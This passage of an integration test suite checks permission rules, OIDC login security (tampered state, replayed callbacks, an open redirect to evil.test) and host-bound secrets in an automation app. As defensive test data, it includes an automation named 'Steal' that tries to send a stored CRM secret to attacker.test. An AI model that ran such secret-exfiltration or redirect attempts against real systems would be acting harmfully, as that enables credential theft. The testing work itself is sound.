      // The link targets must be readable to be written (as in link-record-rules).
      tables[fx.customers.id] = { perm: 'read_only' };
    });
    try {
      // r2 (c2) is out; r1 (c1) is in — also through the read token.
      expect(idsOf(await session('u_sales1', 'GET', orders()))).toEqual([r1]);
      expect(idsOf(await bearer(tk.sales_r.token, 'GET', orders()))).toEqual([r1]);
      const socket = await connectWith(tk.sales_r.token);
      expect(await socket.subscribe(`table:${fx.orders.id}`)).toMatchObject({ type: 'subscribed' });
      const move = (user: FixtureUser, to: Id<'rec'>) =>
        session(user, 'PATCH', `${orders()}?field_key_type=id`, {
          records: [{ id: r1, fields: { [customer]: [to] } }],
        });
      expect((await move('u_editor', c2)).status).toBe(200);
      await socket.next(about('record.removed_from_view', r1));
      expect(idsOf(await session('u_sales1', 'GET', orders()))).toEqual([]);
      expect((await move('u_editor', c1)).status).toBe(200);
      await socket.next(about('record.added', r1));
      // edit_filter on the link: moving r1 out of it is refused, nothing changes.
      expectProblem(await move('u_sales1', c2), 403, 'RECORD_RULE_VIOLATION');
      expect(idsOf(await session('u_sales1', 'GET', orders()))).toEqual([r1]);
    } finally {
      await restoreSales();
    }
    // A text operator on a link is not a valid rule.
    const tables = structuredClone(salesRole.config.tables) as Record<
      string,
      Record<string, unknown>
    >;
    const rule = tables[fx.orders.id] as { record_rule: Record<string, unknown> };
    rule.record_rule = {
      ...rule.record_rule,
      read_scope: 'filter',
      read_filter: { field: customer, operator: 'contains', value: 'x' },
    };
    expectProblem(
      await session('u_admin', 'PATCH', `/bases/${fx.baseId}/roles/${salesRole.id}`, {
        config: { ...salesRole.config, tables },
      }),
      422,
      'INVALID_FILTER',
    );
  });

  // --- P63 -----------------------------------------------------------------------------------

  describe('P63: the fake IdP', () => {
    const identities = () => new UserIdentitiesRepository(db);

    function hintFor(user: FakeOidcUser): string {
      const hint = `hint-${newId('req').slice(4, 14)}`;
      idp.users.set(hint, user);
      return hint;
    }

    function cookieOf(response: Wire, name: string): string | undefined {
      for (const raw of response.headers.getSetCookie()) {
        const [pair = ''] = raw.split(';');
        const index = pair.indexOf('=');
        if (pair.slice(0, index) === name) return pair.slice(index + 1);
      }
      return undefined;
    }

    /** Start → IdP → the callback path, and the state cookie set by start. */
    async function begin(slug: string, hint: string, next?: string) {
      const query = next === undefined ? '' : `?next=${encodeURIComponent(next)}`;
      const started = await send(httpA, 'GET', `/api/v1/auth/oidc/${slug}/start${query}`);
      expect(started.status, started.body).toBe(302);
      const state = cookieOf(started, OIDC_STATE_COOKIE) ?? '';
      const url = new URL(started.headers.get('location') ?? '');
      url.searchParams.set('login_hint', hint);
      const authorized = await fetch(url, { redirect: 'manual' });
      expect(authorized.status).toBe(302);
      const back = new URL(authorized.headers.get('location') ?? '');
      expect(back.origin).toBe(new URL(TEST_PUBLIC_URL).origin);
      return { path: `${back.pathname}${back.search}`, state };
    }

    const callback = (path: string, cookie: string) =>
      send(httpA, 'GET', path, { headers: { cookie } });

    async function signIn(slug: string, hint: string, next?: string): Promise<Wire> {
      const { path, state } = await begin(slug, hint, next);
      return callback(path, `${OIDC_STATE_COOKIE}=${state}`);
    }

    function expectRedirect(response: Wire, location: string, signedIn = false): void {
      expect(response.status, response.body).toBe(302);
      expect(response.headers.get('location')).toBe(location);
      expect(cookieOf(response, SESSION_COOKIE) !== undefined, location).toBe(signedIn);
    }

    it('P63: the email of u_sales1 — LINK_BY_EMAIL=false, or true with email_verified=false → OIDC_ACCOUNT_EXISTS, no identity, no session', async () => {
      const email = fx.users.u_sales1.email;
      expectRedirect(
        await signIn('fake', hintFor({ sub: 'sub-p63-a', email, email_verified: true })),
        '/login?error=OIDC_ACCOUNT_EXISTS',
      );
      expectRedirect(
        await signIn('mail', hintFor({ sub: 'sub-p63-b', email, email_verified: false })),
        '/login?error=OIDC_ACCOUNT_EXISTS',
      );
      expect(await identities().listByUser(fx.users.u_sales1.id)).toEqual([]);
    });

    it('P63: a wrong state, a replayed callback → OIDC_STATE_INVALID', async () => {
      const hint = hintFor({ sub: 'sub-p63-reader', email: 'nobody@example.test' });
      const { path, state } = await begin('fake', hint);
      const tampered = new URL(path, TEST_PUBLIC_URL);
      tampered.searchParams.set('state', 'A'.repeat(43));
      expectRedirect(
        await callback(`${tampered.pathname}${tampered.search}`, `${OIDC_STATE_COOKIE}=${state}`),
        '/login?error=OIDC_STATE_INVALID',
      );
      // The callback clears the single-use state cookie: a replay without it is refused …
      const second = await begin('fake', hint);
      const first = await callback(second.path, `${OIDC_STATE_COOKIE}=${second.state}`);
      expect(first.headers.getSetCookie().join('\n')).toMatch(
        new RegExp(`${OIDC_STATE_COOKIE}=;[^\n]*Max-Age=0`, 'u'),
      );
      expectRedirect(await callback(second.path, ''), '/login?error=OIDC_STATE_INVALID');
      // … and with the old cookie the code is already spent at the provider.
      expectRedirect(
        await callback(second.path, `${OIDC_STATE_COOKIE}=${second.state}`),
        '/login?error=OIDC_PROVIDER_ERROR',
      );
    });

    it('P63: ALLOW_SIGNUP=false → OIDC_SIGNUP_DISABLED, no account', async () => {
      expectRedirect(
        await signIn(
          'fake',
          hintFor({ sub: 'sub-p63-new', email: 'p63-new@example.test', email_verified: true }),
        ),
        '/login?error=OIDC_SIGNUP_DISABLED',
      );
      const { rows } = await sql<{ n: number }>`
        SELECT count(*)::int AS n FROM meta.users WHERE email = 'p63-new@example.test'
      `.execute(db.kysely);
      expect(rows[0]?.n).toBe(0);
    });

    it('P63: next=https://evil.test → back to /, signed in', async () => {
      await identities().create({
        userId: fx.users.u_reader.id,
        provider: 'fake',
        subject: 'sub-p63-u-reader',
        email: fx.users.u_reader.email,
      });
      const hint = hintFor({ sub: 'sub-p63-u-reader', email: fx.users.u_reader.email });
      expectRedirect(await signIn('fake', hint, 'https://evil.test'), '/', true);
    });

    it('P63: linking an identity that belongs to u_editor → IDENTITY_IN_USE', async () => {
      await identities().create({
        userId: fx.users.u_editor.id,
        provider: 'fake',
        subject: 'sub-p63-editor',
        email: fx.users.u_editor.email,
      });
      const started = await session('u_sales1', 'POST', '/me/identities/fake/start');
      expect(started.status, started.body).toBe(200);
      const url = new URL(started.json<{ authorization_url: string }>().authorization_url);
      url.searchParams.set(
        'login_hint',
        hintFor({ sub: 'sub-p63-editor', email: fx.users.u_editor.email, email_verified: true }),
      );
      const state = cookieOf(started, OIDC_STATE_COOKIE) ?? '';
      const authorized = await fetch(url, { redirect: 'manual' });
      const back = new URL(authorized.headers.get('location') ?? '');
      const linked = await callback(
        `${back.pathname}${back.search}`,
        `${await fx.cookie('u_sales1')}; ${OIDC_STATE_COOKIE}=${state}`,
      );
      expect(linked.status, linked.body).toBe(302);
      expect(linked.headers.get('location')).toBe('/account/connections?error=IDENTITY_IN_USE');
      expect(await identities().listByUser(fx.users.u_sales1.id)).toEqual([]);
      expect((await identities().findByProviderSubject('fake', 'sub-p63-editor'))?.user_id).toBe(
        fx.users.u_editor.id,
      );
    });
  });

  // --- P64 -----------------------------------------------------------------------------------

  describe('P64: secret bound to its hosts', () => {
    const httpStep = (url: unknown, secretId: Id<'sec'>) => ({
      id: 'act_http',
      type: 'http_request',
      config: {
        method: 'POST',
        url,
        auth: { header_name: 'Authorization', secret_id: secretId },
      },
    });
    const onOrderCreated = () => ({ type: 'record.created', table_id: fx.orders.id });

    async function finishedRun(id: Id<'aut'>) {
      return eventually(async () => {
        const { rows } = await sql<{ status: string; error: Record<string, unknown> | null }>`
          SELECT status, error FROM meta.automation_runs
           WHERE automation_id = ${id} AND status IN ('succeeded', 'failed', 'skipped')
        `.execute(db.kysely);
        return rows[0];
      }, `run of ${id}`);
    }

    async function enabledFlow(url: unknown, secretId: Id<'sec'>): Promise<Id<'aut'>> {
      const response = await session('u_admin', 'POST', `/bases/${fx.baseId}/automations`, {
        name: `P64 ${newId('aut').slice(4, 12)}`,
        enabled: true,
        definition: { trigger: onOrderCreated(), actions: [httpStep(url, secretId)] },
      });
      expect(response.status, response.body).toBe(201);
      return automationSchema.parse(response.json()).id;
    }

    const disable = async (id: Id<'aut'>) => {
      expect((await session('u_admin', 'POST', `/automations/${id}/disable`)).status).toBe(200);
    };

    const createOrder = async (title: string) => {
      const response = await session('u_admin', 'POST', `${orders()}?field_key_type=id`, {
        records: [{ fields: { [F('title')]: title } }],
      });
      expect(response.status, response.body).toBe(201);
    };

    it('P64: u_sales1 (manage) saves http_request with sec_crm to https://attacker.test/ → 422 SECRET_HOST_NOT_ALLOWED', async () => {
      await salesConfig((tables) => {
        (tables[fx.orders.id] as { perm: string }).perm = 'manage';
      });
      try {
        const response = await session('u_sales1', 'POST', `/bases/${fx.baseId}/automations`, {
          name: 'Steal',
          enabled: true,
          definition: {
            trigger: onOrderCreated(),
            actions: [httpStep({ literal: 'https://attacker.test/' }, secCrm)],
          },
        });
        expectProblem(response, 422, 'AUTOMATION_INVALID');
        expect(problem(response).errors).toEqual([
          expect.objectContaining({
            path: 'definition.actions[0].config.auth.secret_id',
            code: 'SECRET_HOST_NOT_ALLOWED',
          }),
        ]);
      } finally {
        await restoreSales();
      }
      expect(attacker.connections).toBe(0);
    });

    it('P64: a URL from a field pointing at attacker.test → step failed secret_host_not_allowed, 0 connections, the value nowhere', async () => {
      // First the allowed host from the field: delivered with the header.
      const good = await enabledFlow({ field: F('title') }, secCrm);
      await createOrder(`http://${crmHost()}/orders/1`);
      expect(await finishedRun(good)).toMatchObject({ status: 'succeeded' });
      expect(crm.received.find((item) => item.url === '/orders/1')?.headers['authorization']).toBe(
        SECRET_CANARY,
      );
      await disable(good);

      const bad = await enabledFlow({ field: F('title') }, secCrm);
      await createOrder(attackerUrl('/steal'));
      expect(await finishedRun(bad)).toMatchObject({
        status: 'failed',
        error: {
          code: 'secret_host_not_allowed',
          params: { purpose: 'auth', secret_id: secCrm, reason: 'not_listed' },
        },
      });
      await disable(bad);
      expect(attacker.connections).toBe(0);
      expect(attacker.received).toEqual([]);

      for (const logs of [a.logs.raw(), b.logs.raw(), workerLogs.logs.raw()]) {
        expect(logs).not.toContain(SECRET_CANARY);
      }
      const { rows } = await sql<{ everything: string }>`
        SELECT (SELECT coalesce(string_agg(row_to_json(x)::text, ''), '') FROM meta.audit_logs x) ||
               (SELECT coalesce(string_agg(row_to_json(e)::text, ''), '') FROM meta.events e) ||
               (SELECT coalesce(string_agg(row_to_json(r)::text, ''), '') FROM meta.automation_runs r) ||
               (SELECT coalesce(string_agg(row_to_json(s)::text, ''), '') FROM meta.automation_run_steps s) ||
               (SELECT coalesce(string_agg(row_to_json(d)::text, ''), '') FROM meta.http_deliveries d) ||
               (SELECT coalesce(string_agg(j.payload::text, ''), '') FROM graphile_worker._private_jobs j)
                 AS everything
      `.execute(db.kysely);
      expect(rows[0]?.everything).toContain('secret_host_not_allowed');
      expect(rows[0]?.everything).not.toContain('canary-t719');
    });

    it('P64: a legacy secret past its transition period → legacy_expired, before any connection', async () => {
      const created = await session('owner', 'POST', `/orgs/${fx.orgId}/secrets`, {
        kind: 'http_header',
        name: 'legacy',
        value: `${SECRET_CANARY}-legacy`,
        allowed_hosts: ['placeholder.test'],
      });
      expect(created.status, created.body).toBe(201);
      const legacy = created.json<{ id: Id<'sec'> }>().id;
      // As migration 0051 leaves a secret stored before the list existed.
      await sql`
        UPDATE meta.secrets
           SET allowed_hosts = '{}', legacy_hosts_until = now() + interval '30 days'
         WHERE id = ${legacy}
      `.execute(db.kysely);
      clockOffsetMs = 31 * DAY_MS;
      try {
        const flow = await enabledFlow({ field: F('title') }, legacy);
        const connections = crm.connections;
        await createOrder(`http://${crmHost()}/legacy`);
        expect(await finishedRun(flow)).toMatchObject({
          status: 'failed',
          error: {
            code: 'secret_host_not_allowed',
            params: { purpose: 'auth', secret_id: legacy, reason: 'legacy_expired' },
          },
        });
        expect(crm.connections).toBe(connections);
        await disable(flow);
      } finally {
        clockOffsetMs = 0;
      }
    });
  });

  // --- P55 (last: it removes u_sales1 from the organization) ---------------------------------

  describe('P55: tk_sales_r lifecycle', () => {
    it('P55: a wrong checksum → 401 without a database query', async () => {
      const valid = tk.sales_r.token;
      const tampered = `${valid.slice(0, -1)}${valid.at(-1) === 'A' ? 'B' : 'A'}`;
      let response: Wire | undefined;
      const statements = await sqlDuring(async () => {
        response = await bearer(tampered, 'GET', `/bases/${fx.baseId}`);
      });
      expect401(response as Wire, 'UNAUTHENTICATED');
      // The worker and instance B keep polling in this process: only the token
      // lookup (or anything about users and sessions) would be this request's.
      expect(statements.filter((text) => /api_tokens|"users"|sessions/u.test(text))).toEqual([]);
    });

    it('P55: revoked → TOKEN_REVOKED; expired → TOKEN_EXPIRED', async () => {
      const revoked = await createToken('u_sales1', ['records:read']);
      expect((await bearer(revoked.token, 'POST', `${orders()}/query`)).status).toBe(200);
      expect((await session('u_sales1', 'DELETE', `/api-tokens/${revoked.id}`)).status).toBe(204);
      expect401(await bearer(revoked.token, 'POST', `${orders()}/query`), 'TOKEN_REVOKED');
      const expiring = await createToken('u_sales1', ['records:read']);
      await sql`
        UPDATE meta.api_tokens SET expires_at = now() - interval '1 second' WHERE id = ${expiring.id}
      `.execute(db.kysely);
      expect401(await bearer(expiring.token, 'POST', `${orders()}/query`), 'TOKEN_EXPIRED');
    });

    it('P55: g_sales losing its role → Orders 404 at once; back → 200', async () => {
      const removed = await session('owner', 'DELETE', `/bases/${fx.baseId}/role-assignments`, {
        principal_type: 'group',
        principal_id: groupId,
      });
      expect(removed.status, removed.body).toBe(204);
      try {
        expectProblem(
          await bearer(tk.sales_r.token, 'POST', `${orders()}/query`),
          404,
          'NOT_FOUND',
        );
      } finally {
        const restored = await session('owner', 'PUT', `/bases/${fx.baseId}/role-assignments`, {
          principal_type: 'group',
          principal_id: groupId,
          role_id: salesRole.id,
        });
        expect(restored.status, restored.body).toBe(200);
      }
      expect((await bearer(tk.sales_r.token, 'POST', `${orders()}/query`)).status).toBe(200);
    });

    it('P55: the organization turning tokens off → 401 until turned on', async () => {
      const policy = (enabled: boolean) =>
        session('owner', 'PATCH', `/orgs/${fx.orgId}`, { settings: { api_tokens: { enabled } } });
      expect((await policy(false)).status).toBe(200);
      try {
        expect401(await bearer(tk.sales_r.token, 'POST', `${orders()}/query`), 'UNAUTHENTICATED');
      } finally {
        expect((await policy(true)).status).toBe(200);
      }
      expect((await bearer(tk.sales_r.token, 'POST', `${orders()}/query`)).status).toBe(200);
    });

    it('P55: u_sales1 leaving the organization → 401 (its tokens are gone)', async () => {
      const removed = await session(
        'owner',
        'DELETE',
        `/orgs/${fx.orgId}/members/${fx.users.u_sales1.id}`,
      );
      expect(removed.status, removed.body).toBe(204);
      expect401(await bearer(tk.sales_r.token, 'GET', '/me'), 'UNAUTHENTICATED');
      expect401(await bearer(tk.sales_w.token, 'GET', '/me'), 'UNAUTHENTICATED');
    });
  });
});
